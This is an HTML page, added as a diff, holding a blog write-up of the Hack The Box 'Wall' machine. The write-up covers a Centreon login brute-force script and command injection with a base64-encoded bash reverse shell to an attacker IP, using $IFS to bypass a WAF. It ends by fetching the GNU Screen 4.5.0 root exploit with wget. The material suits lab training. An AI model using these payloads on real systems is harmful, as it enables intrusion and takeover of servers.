@@ -1,0 +1,500 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | Wall - Hack The Box</title>
+  <meta name="description" content="Resolution of the Wall machine">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Wall - Hack The Box">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/wall">
+  <meta property="og:description" content="Resolution of the Wall machine">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/wall">
+  <meta name="twitter:title" content="Wall - Hack The Box">
+  <meta name="twitter:description" content="Resolution of the Wall machine">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/wall/wall-00-ada8292c78df8cc1e39842f2b82793203033231ea51977591528f908fd3ed208.png">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/wall/wall-00-ada8292c78df8cc1e39842f2b82793203033231ea51977591528f908fd3ed208.png">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Wall - Hack The Box</h1>
+            <p>Resolution of the Wall machine</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    June 8, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      6 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/hackthebox/wall/wall-00-ada8292c78df8cc1e39842f2b82793203033231ea51977591528f908fd3ed208.png">
+  <img src="/assets/hackthebox/wall/wall-00-ada8292c78df8cc1e39842f2b82793203033231ea51977591528f908fd3ed208.png" alt="Wall banner" class="zooming" data-rjs="/assets/hackthebox/wall/wall-00-ada8292c78df8cc1e39842f2b82793203033231ea51977591528f908fd3ed208.png" data-zooming-width="598" data-zooming-height="379">
+</a></p>
+
+<p>Wall is a medium level machine based on Linux, the initial approach is focused on enumeration and exploitation of a web application named <code class="highlighter-rouge">Centreon</code>.
+Requires some basic/medium knowledge about HTTP requests and exploit customization.
+The privilege escalation process is simple, based on the software named <code class="highlighter-rouge">screen</code>.</p>
+
+<h1 id="recon">Recon</h1>
+
+<p>Starting with Nmap:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># Nmap 7.70 scan initiated Wed Jan 22 15:08:05 2020 as: nmap -sV -sC -oA wall -T4 -p- 10.10.10.157</span>
+Nmap scan report <span class="k">for </span>10.10.10.157
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Wed Jan 22 15:19:43 2020 -- 1 IP address (1 host up) scanned in 698.06 seconds</span></code></pre></figure>
+
+<p>The scan result show us that the port 80 is open and accessing it results in the default Apache page:</p>
+
+<p><a href="/assets/hackthebox/wall/wall-01-2d05c9afe57bb598d07f03b4f3c02f98907a53994f07025dcbbc266d56d18f0f.png">
+  <img src="/assets/hackthebox/wall/wall-01-2d05c9afe57bb598d07f03b4f3c02f98907a53994f07025dcbbc266d56d18f0f.png" alt="Wall Recon" class="zooming" data-rjs="/assets/hackthebox/wall/wall-01-2d05c9afe57bb598d07f03b4f3c02f98907a53994f07025dcbbc266d56d18f0f.png" data-zooming-width="1080" data-zooming-height="536">
+</a></p>
+
+<p>Let’s enumerate using the gobuster tool:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-u</span> http://10.10.10.157 <span class="nt">-t20</span>
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://10.10.10.157
+<span class="o">[</span>+] Threads:        20
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/01/24 11:14:05 Starting gobuster
+<span class="o">===============================================================</span>
+/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+/monitoring <span class="o">(</span>Status: 401<span class="o">)</span>
+/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+<span class="o">===============================================================</span>
+2020/01/24 11:16:59 Finished
+<span class="o">===============================================================</span></code></pre></figure>
+
+<p>The <code class="highlighter-rouge">/monitoring</code> directory returns a HTTP Basic Auth page, where we don’t have any credentials at moment.
+Running the tool again with <code class="highlighter-rouge">.php</code> extension gave us some interesting .php files:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-u</span> http://10.10.10.157 <span class="nt">-t20</span> <span class="nt">-x</span> php
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://10.10.10.157
+<span class="o">[</span>+] Threads:        20
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Extensions:     php
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/01/24 12:03:16 Starting gobuster
+<span class="o">===============================================================</span>
+/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htpasswd.php <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htaccess.php <span class="o">(</span>Status: 403<span class="o">)</span>
+/aa.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/monitoring <span class="o">(</span>Status: 401<span class="o">)</span>
+/panel.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+<span class="o">===============================================================</span>
+2020/01/24 12:08:08 Finished
+<span class="o">===============================================================</span></code></pre></figure>
+
+<p>The <code class="highlighter-rouge">aa.php</code> file only returns “1”, doing some parameter fuzzing results in nothing.
+The <code class="highlighter-rouge">panel.php</code> file returns “Just a test for php file !”, fuzzing the parameters results in nothing again.</p>
+
+<p>Returning to <code class="highlighter-rouge">monitoring</code> and sending a POST request we got:</p>
+
+<p><a href="/assets/hackthebox/wall/wall-02-a80cc803e6d4504fa91c7b92d85521fd999425b95cf55dce7414d1e401152d31.png">
+  <img src="/assets/hackthebox/wall/wall-02-a80cc803e6d4504fa91c7b92d85521fd999425b95cf55dce7414d1e401152d31.png" alt="Wall Recon" class="zooming" data-rjs="/assets/hackthebox/wall/wall-02-a80cc803e6d4504fa91c7b92d85521fd999425b95cf55dce7414d1e401152d31.png" data-zooming-width="576" data-zooming-height="151">
+</a></p>
+
+<p>Then following the redirection we have the following response:</p>
+
+<p><a href="/assets/hackthebox/wall/wall-03-43b88baab3824ae3ececb36dc8de74b82404bf2b0df6afd031d45fcd4688f729.png">
+  <img src="/assets/hackthebox/wall/wall-03-43b88baab3824ae3ececb36dc8de74b82404bf2b0df6afd031d45fcd4688f729.png" alt="Wall Recon" class="zooming" data-rjs="/assets/hackthebox/wall/wall-03-43b88baab3824ae3ececb36dc8de74b82404bf2b0df6afd031d45fcd4688f729.png" data-zooming-width="441" data-zooming-height="84">
+</a></p>
+
+<p>The <code class="highlighter-rouge">/centreon</code> page has a login form to the Centreon admin panel, version <code class="highlighter-rouge">v.19.04.0</code>:</p>
+
+<p><a href="/assets/hackthebox/wall/wall-04-8e7baa981a9bb980ca8c2886ed9746351000cf0f9937895c11fe9e3aceef8e8d.png">
+  <img src="/assets/hackthebox/wall/wall-04-8e7baa981a9bb980ca8c2886ed9746351000cf0f9937895c11fe9e3aceef8e8d.png" alt="Wall Recon" class="zooming" data-rjs="/assets/hackthebox/wall/wall-04-8e7baa981a9bb980ca8c2886ed9746351000cf0f9937895c11fe9e3aceef8e8d.png" data-zooming-width="942" data-zooming-height="429">
+</a></p>
+
+<p>Quick note about Centreon: Centreon is a web application that supervises hybrid infrastructures.</p>
+
+<p>I made a small script to bruteforce the Centreon login form and after a couple tries we successfully got the credentials to the admin panel!</p>
+
+<p><a href="/assets/hackthebox/wall/wall-05-a6d766a7dcba941c8e15f7a63756fc576f32f4b7d420ede3e5e47aecb51681d2.png">
+  <img src="/assets/hackthebox/wall/wall-05-a6d766a7dcba941c8e15f7a63756fc576f32f4b7d420ede3e5e47aecb51681d2.png" alt="Wall Recon" class="zooming" data-rjs="/assets/hackthebox/wall/wall-05-a6d766a7dcba941c8e15f7a63756fc576f32f4b7d420ede3e5e47aecb51681d2.png" data-zooming-width="334" data-zooming-height="258">
+</a></p>
+
+<p>My bruteforce script:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># -*- coding: utf-8 -*-
+</span>
+<span class="c1"># Centreon bruteforce login
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    
+    <span class="n">username</span> <span class="o">=</span> <span class="s">'admin'</span>
+    <span class="n">passwords</span> <span class="o">=</span> <span class="p">[]</span>
+    
+    <span class="c1"># https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt
+</span>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'10k-most-common.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="n">errors</span> <span class="o">=</span> <span class="s">'ignore'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">passwords</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">readlines</span><span class="p">()</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+    
+    <span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+    
+            
+    <span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">:</span>
+        
+        <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://10.10.10.157/centreon"</span><span class="p">)</span>
+        <span class="n">centreon_token</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'centreon_token" type="hidden" value="'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'" /&gt;'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    
+        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s">"useralias"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+            <span class="s">"password"</span><span class="p">:</span> <span class="n">password</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="s">''</span><span class="p">),</span>
+            <span class="s">"submitLogin"</span><span class="p">:</span> <span class="s">"Connect"</span><span class="p">,</span>
+            <span class="s">"centreon_token"</span><span class="p">:</span> <span class="n">centreon_token</span>
+        <span class="p">}</span>
+        
+        <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://10.10.10.157/centreon/index.php"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
+        
+        <span class="k">if</span> <span class="s">"main.php"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">url</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">" [*] Logged with success!"</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">" [*] Credentials: {}:{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span>
+            <span class="k">break</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">" [*] Failed!"</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span></code></pre></figure>
+
+<p>Then we finally have access to the Centreon admin panel:</p>
+
+<p><a href="/assets/hackthebox/wall/wall-06-778c6c3d19cc819f2f6dc2ddba537de1d020cc5ff13e7bfcd88154dd9ac40ea0.png">
+  <img src="/assets/hackthebox/wall/wall-06-778c6c3d19cc819f2f6dc2ddba537de1d020cc5ff13e7bfcd88154dd9ac40ea0.png" alt="Wall Recon" class="zooming" data-rjs="/assets/hackthebox/wall/wall-06-778c6c3d19cc819f2f6dc2ddba537de1d020cc5ff13e7bfcd88154dd9ac40ea0.png" data-zooming-width="998" data-zooming-height="386">
+</a></p>
+
+<h1 id="exploiting---understanding-and-modifying-exploits">Exploiting - Understanding and modifying exploits</h1>
+
+<p>Searching for <code class="highlighter-rouge">Centreon 19.04</code> exploits on Google we found an interesting exploit, it’s an authenticated RCE but this exploit doesn’t work for some reason.</p>
+
+<p>Investigating the reason to why this exploit doesn’t work we found a command injection parameter inside the payload dictionary.
+The <code class="highlighter-rouge">nagios_bin</code> parameter sends the reverse shell stager, this parameter can be found when you create or edit a Centreon pooler:</p>
+
+<p><a href="/assets/hackthebox/wall/wall-07-bd7d236289620a281f7d9c33973dcdaca2c807670123bcdf76d77f8e2a04a4f6.png">
+  <img src="/assets/hackthebox/wall/wall-07-bd7d236289620a281f7d9c33973dcdaca2c807670123bcdf76d77f8e2a04a4f6.png" alt="Wall Exploiting" class="zooming" data-rjs="/assets/hackthebox/wall/wall-07-bd7d236289620a281f7d9c33973dcdaca2c807670123bcdf76d77f8e2a04a4f6.png" data-zooming-width="1001" data-zooming-height="524">
+</a></p>
+
+<p>Sending this command through the parameter using the panel results in the following response from the server:</p>
+
+<p><a href="/assets/hackthebox/wall/wall-08-bb70ae4bdd725f649182fd02f8fec8d63bbd8b3bb4d7013d8cde40f2d7ecb467.png">
+  <img src="/assets/hackthebox/wall/wall-08-bb70ae4bdd725f649182fd02f8fec8d63bbd8b3bb4d7013d8cde40f2d7ecb467.png" alt="Wall Exploiting" class="zooming" data-rjs="/assets/hackthebox/wall/wall-08-bb70ae4bdd725f649182fd02f8fec8d63bbd8b3bb4d7013d8cde40f2d7ecb467.png" data-zooming-width="667" data-zooming-height="252">
+</a></p>
+
+<p>A WAF is behind the web application, blocking our requests that contains some illegal characters.</p>
+
+<p>Trying to bypass this kind of protection we found a way to make it work, all we need to do is replace the whitespace with <code class="highlighter-rouge">$IFS</code> and encode part of the payload in base64:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/10.10.14.13/4444 0&gt;&amp;1"</span> | <span class="nb">base64</span>
+<span class="c"># YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDQ0IDA+JjEK</span>
+
+<span class="nb">echo</span> <span class="s2">"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDQ0IDA+JjEK"</span>|base64 <span class="nt">-d</span>|bash<span class="p">;</span>
+
+<span class="nb">echo</span><span class="nv">$IFS</span><span class="s2">"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDQ0IDA+JjEK"</span>|base64<span class="nv">$IFS</span><span class="nt">-d</span>|bash<span class="p">;</span></code></pre></figure>
+
+<p>After that we can bypass the WAF and update the Centreon pooler with our malicious parameter.
+To trigger our exploit all we need to do is set up our netcat listener and send a POST request to the following endpoint:</p>
+
+<blockquote>
+  <p>http://10.10.10.157/centreon/include/configuration/configGenerate/xml/generateFiles.php</p>
+</blockquote>
+
+<p>With the following parameters:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="o">{</span>
+    <span class="s2">"poller"</span>: <span class="s2">"1"</span>,
+    <span class="s2">"debug"</span>: <span class="s2">"true"</span>,
+    <span class="s2">"generate"</span>: <span class="s2">"true"</span>,
+<span class="o">}</span></code></pre></figure>
+
+<p>After that we got a reverse shell as www-data user!</p>
+
+<p><a href="/assets/hackthebox/wall/wall-09-045ad0fd41ccd219666ee2d943f6d1a1c3fc429347a5111d97cf7ab4c92fa5d0.png">
+  <img src="/assets/hackthebox/wall/wall-09-045ad0fd41ccd219666ee2d943f6d1a1c3fc429347a5111d97cf7ab4c92fa5d0.png" alt="Wall Exploiting" class="zooming" data-rjs="/assets/hackthebox/wall/wall-09-045ad0fd41ccd219666ee2d943f6d1a1c3fc429347a5111d97cf7ab4c92fa5d0.png" data-zooming-width="554" data-zooming-height="152">
+</a></p>
+
+<h1 id="exploiting---using-a-custom-exploit">Exploiting - Using a custom exploit</h1>
+
+<p>For knowledge purposes I made a custom exploit that exploits this authentication RCE and spawn an interactive reverse shell to us, it’s available on my GitHub :)</p>
+
+<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/wall" target="_blank">Wall Exploit</a></p>
+
+<p><a href="/assets/hackthebox/wall/wall-10-81bc9fe6f8dcc1f68adecd7051f7fdc3300dd4d38885d6d837d01661ec4eaed1.png">
+  <img src="/assets/hackthebox/wall/wall-10-81bc9fe6f8dcc1f68adecd7051f7fdc3300dd4d38885d6d837d01661ec4eaed1.png" alt="Wall Exploiting" class="zooming" data-rjs="/assets/hackthebox/wall/wall-10-81bc9fe6f8dcc1f68adecd7051f7fdc3300dd4d38885d6d837d01661ec4eaed1.png" data-zooming-width="821" data-zooming-height="336">
+</a></p>
+
+<h1 id="post-exploitation---exploiting-a-vulnerable-binary">Post Exploitation - Exploiting a vulnerable binary</h1>
+
+<p>Doing a system recon we found an interesting thing, the <code class="highlighter-rouge">screen</code> program has the version attached to its name (4.5.0), a very unsual thing.</p>
+
+<p><a href="/assets/hackthebox/wall/wall-11-519b76682de4dd2472b1aa3f2df38111817a1720cd97b8eb3f8484b0864fb44f.png">
+  <img src="/assets/hackthebox/wall/wall-11-519b76682de4dd2472b1aa3f2df38111817a1720cd97b8eb3f8484b0864fb44f.png" alt="Wall Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/wall/wall-11-519b76682de4dd2472b1aa3f2df38111817a1720cd97b8eb3f8484b0864fb44f.png" data-zooming-width="451" data-zooming-height="210">
+</a></p>
+
+<p>Googling for any vulnerability for this version, we found a local exploit that escalates the system privileges to root.</p>
+
+<p><a href="https://www.exploit-db.com/exploits/41154" target="_blank">GNU Screen 4.5.0 - Local Privilege Escalation</a></p>
+
+<p>Using the Python module named <code class="highlighter-rouge">SimpleHTTPServer</code>, we serve the exploit to be downloaded into the box machine:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">python <span class="nt">-m</span> SimpleHTTPServer 8000</code></pre></figure>
+
+<p>Downloading the exploit on the server’s side and gaving it execution permission:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">wget http://10.10.14.13:8000/41154.sh <span class="nt">-O</span> /tmp/41154.sh <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +x /tmp/41154.sh</code></pre></figure>
+
+<p>Now everything we need to do is execute the exploit and in matter of seconds we got the root shell, gaving us access to both flags, user and root!</p>
+
+<p><a href="/assets/hackthebox/wall/wall-12-8dee00114d021a8ff7f3d7a8fa39392e28532bdebabe12b5403cf2282f13f6cc.png">
+  <img src="/assets/hackthebox/wall/wall-12-8dee00114d021a8ff7f3d7a8fa39392e28532bdebabe12b5403cf2282f13f6cc.png" alt="Wall Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/wall/wall-12-8dee00114d021a8ff7f3d7a8fa39392e28532bdebabe12b5403cf2282f13f6cc.png" data-zooming-width="791" data-zooming-height="467">
+</a></p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Wall+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/wall%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewbox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"></path></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/wall" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewbox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"></path></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
